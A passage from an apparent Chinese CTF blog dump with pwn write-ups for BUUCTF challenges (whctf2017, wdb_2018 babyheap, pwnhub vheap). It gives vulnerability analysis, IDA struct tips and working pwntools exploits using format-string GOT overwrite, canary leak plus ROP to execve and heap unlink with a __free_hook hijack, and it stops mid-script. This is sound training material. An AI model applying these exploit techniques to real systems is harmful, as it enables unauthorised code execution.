<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:27618&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xC05</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x3e8</span>+<span class="string">&quot;b&quot;</span>*<span class="number">2</span>+<span class="string">&quot;%396$p%397$p&quot;</span><span class="comment"># libc addr 393+4</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;397$p\n&quot;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0xda0</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x20830</span><span class="comment">#0x20840</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">value=(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    log_info(<span class="built_in">hex</span>(value%<span class="number">0x10000</span>))</span><br><span class="line">    payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3e8</span>+<span class="string">b&quot;bb%&quot;</span>+<span class="built_in">str</span>(value%<span class="number">0x10000</span>-<span class="number">0x3e8</span>-<span class="number">0x16</span>).encode()+<span class="string">b&quot;c%133$hn&quot;</span>+p64(base_addr+e.got[<span class="string">&#x27;free&#x27;</span>]+i*<span class="number">2</span>)</span><br><span class="line">    value=value&gt;&gt;<span class="number">16</span></span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Welcome To WHCTF2017:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xD40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Code:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input Your Name:\n&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301808658.png" alt="image-20221230180818030" style="zoom:50%;" />



<h2 id="whctf2017-rc4"><a href="#whctf2017-rc4" class="headerlink" title="whctf2017_rc4"></a>whctf2017_rc4</h2><h3 id="保护策略-3"><a href="#保护策略-3" class="headerlink" title="保护策略"></a>保护策略</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302213510.png" alt="image-20221230221340383" style="zoom:50%;" />

<h3 id="漏洞所在-3"><a href="#漏洞所在-3" class="headerlink" title="漏洞所在"></a>漏洞所在</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302214459.png" alt="image-20221230221432405" style="zoom: 50%;" />

<p>这里存在了一个无法触发的格式化字符串漏洞，因为v1取的是一个字节的数据，但是rand生成的随机数是四字节的，无论如何也无法通过这个If检查触发格式化字符串漏洞</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302216225.png" alt="image-20221230221652145" style="zoom:50%;" />

<p>这里存在一个未初始化漏洞，如果进入这个函数不选择a b或者c的话，那么会跳转到LABEL_12的地方，而v2这个位置则是一个canary(这里我是先看roderick师傅写的wp，说可以利用这里泄露出来canary，然后调试了一下发现确实如此，如果单纯看代码的话确实无法发现这里是一个canary)</p>
<p>这个canary又被放到了*0x6020D8的位置，而后有个打印函数将0x6020D0开始16个字节进行了泄露，由此得到了canary</p>
<p>下图展示的代码部分还存在一个明显的栈溢出漏洞</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302222846.png" alt="image-20221230222229763" style="zoom:50%;" />

<h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>先泄露canary，然后利用栈溢出打ret2libc，我这里选择返回的是bss段上，进行了一个栈迁移，最后迁移过去的执行流是调用了execve(“&#x2F;bin&#x2F;sh\x00”,0,0) 当时用system发现没打通，索性就换成execve系统调用了</p>
<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26330&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">bss_addr=<span class="number">0x6020D8</span></span><br><span class="line">leave_ret=<span class="number">0x401218</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;u&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x401219</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(canary)[::-<span class="number">1</span>]+p64(bss_addr-<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss_addr)+p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])+p64(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">puts_addr=recv_libc()</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&quot;puts&quot;</span>,puts_addr,libc)</span><br><span class="line">pop_rdx=<span class="number">0x0000000000001b92</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">pop_rsi=<span class="number">0x00000000000202e8</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">execve=<span class="number">0x00000000000cc770</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(execve)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/seaaseesa/article/details/106694651">(whctf2017_stackoverflow ha1vk的博客-CSDN博客_whctf2017stackoverflow</a></p>
<p><a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write#%E4%BB%BB%E6%84%8F%E5%86%99">IO FILE 之任意读写 « 平凡路上 (ray-cp.github.io)</a></p>
<p>[WHCTF 2017 note_sys | giantbranch’s blog](<a href="https://www.giantbranch.cn/2017/12/11/WHCTF">https://www.giantbranch.cn/2017/12/11/WHCTF</a> 2017 note_sys&#x2F;)</p>
<p><a href="https://blog.csdn.net/seaaseesa/article/details/103089382">(44条消息) 攻防世界PWN之EasyPwn题解_ha1vk的博客-CSDN博客_pwn-sai_easy 解题思路</a></p>
<p><a href="https://roderickchan.github.io/2022/04/15/BUUCTF-pwn-tasks-20/#whctf2017-rc4">BUUCTF-pwn合集 - Lynne’s House (roderickchan.github.io)</a></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>IO_FILE attack</tag>
      </tags>
  </entry>
  <entry>
    <title>wdb_2018_1st_babyheap</title>
    <url>/posts/ebc85e8a.html</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这道题的学习与总结有：</p>
<p>这道题考察的依然是利用UAF打unlink。unlink攻击的核心是可以伪造fake_chunk以及控制fake_chunk下面的堆块的chunk头。虽然无法直接溢出，但是我们可以做一个double free，然后打fastbin attack将chunk头申请出来(在低地址堆块中写入size，保证chunk头可以从fastbin上出来)，接着就可以打unlink了。</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220905195216743-36339851.png"></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序中就存在一个UAF漏洞(如下图)</p>
<p><img src="/../img/2706180-20220905195226020-1085425690.png"></p>
<p>同时限制了我们使用edit函数的次数为3次，限制了add函数的次数10次。最关键的是我们无法控制malloc出来堆块的大小，定死的size就是0x30。(如下图)</p>
<p><img src="/../img/2706180-20220905195236331-894639914.png"></p>
<p>然后下面自定义的输入函数也不存在off by one以及溢出。</p>
<p><img src="/../img/2706180-20220905195245678-421374853.png"></p>
<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>因为我们malloc申请的堆块大小是固定的0x30字节的，这样我们就没法得到libc地址，我们必须想办法让堆块进入unsorted bin中，这样执行show函数才能获取libc地址。所以我们肯定是要利用double free+fastbin attack将chunk头申请出来去修改堆块的size。</p>
<p>在这之前我们需要获取堆地址，然后多垫几个堆块，保证修改之后，堆块地址加上自身size后依然可以找到下一个正确的堆块地址。因为我们要将chunk头申请出来，就意味着我们需要伪造一个size，去通过fastbin的检查。<strong>（edit函数用的时候要慎重，最后我们打unlink写入地址时就需要用掉两个edit函数的机会，所以我们前面的各种布局只能用一次edit函数，而且这次肯定还是要在fastin attack的时候用）</strong></p>
<p>然后我们下面放三种堆块布局，分别是正常的堆块A和堆块B，伪造size，申请chunk B head的布局，unlink时的堆块A和堆块B布局</p>
<p><strong>正常的堆块A和堆块B布局如下：</strong></p>
<p><img src="/../img/2706180-20220905195256837-2078069966.png"></p>
<p>因为<strong>我们想把chunk B head申请出来，因此我们需要伪造size</strong>，如下：</p>
<p>我解释一下这个图，首先我们是要控制chunk B head，因此我们先打一个double free+fastbin attack，将fake chunk（也就是黑色框中的部分）申请出来，这样我们往fake chunk中写入数据，就可以控制chunk B head了(将chunk B的size改成0xa0)，而在这之前我们需要在chunk A中的用户区写入0x31这个size(否则无法通过从fastbin中申请chunk的检查)</p>
<p><img src="/../img/2706180-20220905195309452-65115390.png"></p>
<p>上一步可以控制chunk B head后，我们把chunk B释放掉后，它就进入了unsorted bin中。同时别忘记unlink的条件，我们需要一个大于fastbin 范围的堆块作为引线堆块，所以释放这个chunk B的时候，我们还需要顺便打一个unlink。另外我们还需要布局一个fake chunk，这个fake chunk的size肯定要是0x20，因此我们需要修改下chunk A中的user data，但是我们不能再用edit函数了，所以这里采用的方法是释放掉chunk A，然后再申请回来，写入0x21这个size，同时还要写入ptr-0x18和ptr-0x10。</p>
<p><strong>最终的unlink时布局如下</strong>：</p>
<p><img src="/../img/2706180-20220905195319371-1640510939.png"></p>
<p>emmm，只要是熟悉unlink的师傅，应该都能看懂上面这个布局，最后提一下这个fake chunk是打fastbin attack强行错位申请出来的。<u>而为什么这个fake chunk的头必须要从0x603010开始，不能从0x603020开始？这是因为chunk B的地址是定死的，而它上面的内存单元必须是ptr-0x18和ptr-0x10，如果0x603020这个地址当做fake chunk head的话，那么0x603020这里应该是fake chunk的prev size，这样就不是ptr-0x18了，所以fake chunk必须在0x603010的地址开始。</u></p>
<p>然后打一个unlink，此时我们就可以控制bss段存放堆块的地址了，而此时我们还有两次执行edit函数的机会。由于我们在chunk B释放后执行show函数也得到了libc地址，因此我们直接用edit函数写一个free_hook的地址在bss段上，再edit函数往里写一个system的地址。最后free掉一个存有&#x2F;bin&#x2F;sh\x00字符串的堆块即可获取shell。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400D7D</span></span><br><span class="line">d_a=<span class="number">0x400D59</span></span><br><span class="line">d_e=<span class="number">0x400D65</span></span><br><span class="line">d_s=<span class="number">0x400D71</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25004&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment">#sleep(4)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    add(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">    add(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    heap_addr=u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(heap_addr-<span class="number">0x20</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    </span><br><span class="line">    ptr=<span class="number">0x602060</span></span><br><span class="line">    add(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#debug(p,0x400C86,d_d,d_a,d_s,d_e,0x400BD9)</span></span><br><span class="line">    add(<span class="number">5</span>,p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">7</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    one_gadget=search_og(<span class="number">0</span>)+libc_base</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_hook))</span><br><span class="line">    edit(<span class="number">0</span>,p64(sys_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>vheap--pwnhub五月公开赛</title>
    <url>/posts/b7f5642c.html</url>
    <content><![CDATA[<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习与收获有:</p>
<p>1、本题的核心是劫持__free_hook。利用memcpy溢出，更改free状态堆块的fd指针，将其改写完__free_hook的地址，然后申请回来，写入system地址，最终free掉存有&#x2F;bin&#x2F;sh的堆块获取shell。</p>
<p>2、学会了新技能——使用IDA新建结构体，同时分析了IDA中的宏，通过对这个宏取字节的分析又加深了对指针的理解<br>3、使用sprintf的格式化字符串漏洞泄露数据时，要考虑到format在第二个参数的影响，最后的距离栈顶的偏移只加5（并不考虑rdi寄存器）</p>
<p>4、做的第一道堆题，体会到了在堆块中布局来获取shell的思想。</p>
<span id="more"></span>

<h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略:"></a>保护策略:</h2><p><img src="/../img/2706180-20220514175612986-253149422.png"></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析:"></a>程序分析:</h2><h3 id="使用IDA创建结构体"><a href="#使用IDA创建结构体" class="headerlink" title="使用IDA创建结构体"></a>使用IDA创建结构体</h3><p>打开最后一个函数，发现懵懵逼逼的。</p>
<p><img src="/../img/2706180-20220514175619263-121762209.png"></p>
<p>请教了roderick师傅后才知道这里应该新建一个结构体进行分析，因为这里通过分析就是在取32位整数的四个字节（分析SBYTE1和SBYTE2、HIBYTE这几个宏观察出来的）。因为IDA生成伪代码的时候，并不能百分百的确认这是一个结构体，所以只能靠这种宏的形式展示出来，为了方便分析我们需要手动构造一个结构体。</p>
<p>首先创建结构体之前，必须要分析出来结构体里的成员数量和类型。</p>
<p>这个函数的形参是int类型的a1，而之后SBYTE2和HIBYTE、SBYTE1都是取的a1中的某一字节，因此猜测这个结构体是四个char类型的变量。</p>
<h4 id="创建结构体-方法1："><a href="#创建结构体-方法1：" class="headerlink" title="创建结构体 方法1："></a>创建结构体 方法1：</h4><p><img src="/../img/2706180-20220514175624982-2031282091.png"></p>
<p><img src="/../img/2706180-20220514182146085-26007685.png"></p>
<p>然后输入结构体的名字</p>
<p><img src="/../img/2706180-20220514180610163-205234172.png"></p>
<p>将光标点到ends上，然后按d</p>
<p><img src="/../img/2706180-20220514180637568-1730011386.png"></p>
<p>先创建四个变量，然后将光标点到field_0上，按n，重命名</p>
<p><img src="/../img/2706180-20220514180651445-1703543613.png"></p>
<p>最后将光标点到函数名上，按y，然后修改第二个红色框里的内容（改成结构体的名字，我这里是更改成value）</p>
<p><img src="/../img/2706180-20220514180703104-1762048814.png"></p>
<p>效果如下：</p>
<p><img src="/../img/2706180-20220514180712905-1869244594.png"></p>
<p>还有一种方法：</p>
<h4 id="创建结构体-方法2："><a href="#创建结构体-方法2：" class="headerlink" title="创建结构体 方法2："></a>创建结构体 方法2：</h4><p><img src="/../img/2706180-20220514180306157-2026482700.png" alt="image-20220513155653337"></p>
<p>然后右键插入</p>
<p><img src="/../img/2706180-20220514180305556-1203311905.png" alt="image-20220513155758601"></p>
<p>然后编辑结构体即可</p>
<p><img src="/../img/2706180-20220514180832544-593075132.png"></p>
<p>最后将原本的数据类型换成定义好的结构即可</p>
<p><img src="/../img/2706180-20220514180849983-205219515.png"></p>
<p><img src="/../img/2706180-20220514180901098-1038564234.png"></p>
<p>效果如下：</p>
<p><img src="/../img/2706180-20220514180915039-1521065964.png"></p>
<p>不过改完之后发现还是懵懵逼逼，因为还有个奇怪的qword_202D00不知道在干嘛。按x看一下交叉引用，发现了下面的代码</p>
<p><img src="/../img/2706180-20220514180927780-335719541.png"></p>
<p>这里看起来是在进行初始化，不过干啥用的还是懵懵逼逼。roderick师傅告诉我说，这里循环了16个次，回想起题目的名字是vheap（虚拟机堆题，这道题只模拟了寄存器和opcode），因此猜测这里是将所有的寄存器进行了初始化。因此我们将这个qword_202D68给重命名regs。</p>
<p>最后看起来舒服多了，分析着也比较方便。</p>
<p><img src="/../img/2706180-20220514180938745-1280833798.png"></p>
<h3 id="存在格式化字符串漏洞"><a href="#存在格式化字符串漏洞" class="headerlink" title="存在格式化字符串漏洞"></a>存在格式化字符串漏洞</h3><p><img src="/../img/2706180-20220514180947642-1290198064.png"></p>
<p>因为开了PIE，想实现任意写是够呛了，只能利用一次，而且没有准备好的跳板，因此猜测这里应该是用来泄露函数真实地址以来获取libc基地址的。</p>
<p>然后此处进行了一次输入</p>
<p><img src="/../img/2706180-20220514180959726-926685542.png"></p>
<p>最多输入2，接下来的循环最多跑三次，这个循环是从2020E0这里开始存一些数据。</p>
<p><img src="/../img/2706180-20220514181007362-1502659209.png"></p>
<p>这里输入一个不大于9的数字，然后循环会跑对应的次数，不过这里看着有点懵，不知道有啥用，那就继续往后分析。</p>
<p><img src="/../img/2706180-20220514181022124-806979207.png"></p>
<p>这个函数中的qword_202D78处于是bss段，存放的是0，通过循环每次+1，有点跟计数器一样，去不断的改变V1这个索引，来返回不同的值，索引是根据dword_202500找的，暂且记下，继续分析。</p>
<p>接下来就要分析最后的函数了。</p>
<p><img src="/../img/2706180-20220514180304098-1657473361.png" alt="image-20220513201827044"></p>
<p>先是这个if不是太好过，卡了我很久。</p>
<h3 id="分析取一字节宏的实现"><a href="#分析取一字节宏的实现" class="headerlink" title="分析取一字节宏的实现"></a>分析取一字节宏的实现</h3><p>这里换回原本的宏来说。就分析SBYTE1这一个宏吧。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SBYTE1(x)   SBYTEn(x,  1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n))</span></span><br><span class="line"><span class="keyword">typedef</span>          <span class="type">char</span>   int8;</span><br></pre></td></tr></table></figure>

<p>&amp;x 表示x的地址</p>
<p>(int8 *)&amp;x这个地址转换成char *类型，不过这个地址依然不变，变的仅仅是它的类型</p>
<p>*((int8 *)&amp;x+n)   +n代表在原本的地址上加n个内存单元的偏移，这个内存单元取决于什么？取决于指针指向的变量类型，因为被强转成了char *，因此现在的变量是char类型，所以+n就等同于x的地址+n字节，最终*取出指针对应的一字节的值。</p>
<p>为什么要强转成char *类型，不强转行不行？</p>
<blockquote>
<p>不行，强转成char *的目的是为了分别访问原本int类型变量的每个字节。不强转的话，+n就直接跳过了n个四字节的内存单元。</p>
</blockquote>
<p>因此得出结论SBYTE1的意思就是获取指定变量的第二字节（我是从低地址数的）。依次类推，SBYTE2就是获取第三字节，我们分别在结构体中把它们命名为two_byte、three_byte。</p>
<p>再拐过来看检查。</p>
<p><img src="/../img/2706180-20220514180303868-1305720818.png" alt="image-20220513214802748"></p>
<p>这个就是需要变量a1的第一字节和第三字节，要大于等于0 小于等于2。看下a1是什么？</p>
<p>一顿溯源之后，发现它就是qword_202500靠偏移得出来的值，再溯源一下，看看我们是否对这个qword_202500进行了输入</p>
<p><img src="/../img/2706180-20220514181132310-878458808.png"></p>
<p>下图中发现了，我们是可以控制dword_202500的值，因此这意味着我们可以控制输入的值的第一第三字节来绕过检查。</p>
<p><img src="/../img/2706180-20220514181144499-886432126.png"></p>
<p><img src="/../img/2706180-20220514180303512-502508280.png" alt="image-20220513215318327"></p>
<p><img src="/../img/2706180-20220514181203734-401889871.png"></p>
<p><img src="/../img/2706180-20220514180303249-943265363.png" alt="image-20220513215355579"></p>
<p>通过观察，发现了这三个核心函数，进入他们的条件就是控制第四字节的值即可。</p>
<h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路:"></a>大致思路:</h2><p>free函数执行后把指针给置空了，这里无法利用，那只能去观察memcpy函数了。观察memcpy函数的第一个参数，发现它和malloc返回的地址是一样的，这就意味着我们可以往&amp;unk_2020E0+64(__int64)a1.three_byte这个地址写入数据，然后复制给malloc中，可以复制0x40个字节，这里很明显存在溢出。</p>
<p>于是思路就是利用溢出修改当前chunk的下一个chunk(需要被free掉）的fd指针，然后我们再执行malloc时，是可以申请回来一个指定的地址。我们可以去修改__free_hook（free函数执行之前，会检查__free_hook，如果其值为NULL，则调用_int_free函数，否则调用__free_hook所指向的值）</p>
<p>申请回来之后，我们可以利用memcpy把system地址写入__free_hook所指向的地方。最后再把一个堆块里存入&#x2F;bin&#x2F;sh字符串，free掉这个堆块即可获取shell。</p>
<h2 id="调试来构建exp"><a href="#调试来构建exp" class="headerlink" title="调试来构建exp"></a>调试来构建exp</h2><p>首先我们要先尝试去绕过下面这个if检查，并且尝试执行一下malloc函数，其他的暂时先随便输入即可。</p>
<p><img src="/../img/2706180-20220514181218429-18861707.png"></p>
<p><img src="/../img/2706180-20220514180302997-106339106.png" alt="image-20220514090631642"></p>
<p>观察上面执行malloc的情况，这个要求我们的最高字节是10，才能执行malloc，然后第三字节决定了malloc的大小（two_byte是从低字节数的，第三字节是从高字节数的），然后这个把malloc这个地址记录在a1.one_byte偏移这里。</p>
<p>我们暂定申请0x10大小的chunk，然后将one_byte设置成0，那目前的exp应该为下面这个？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xec6)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span 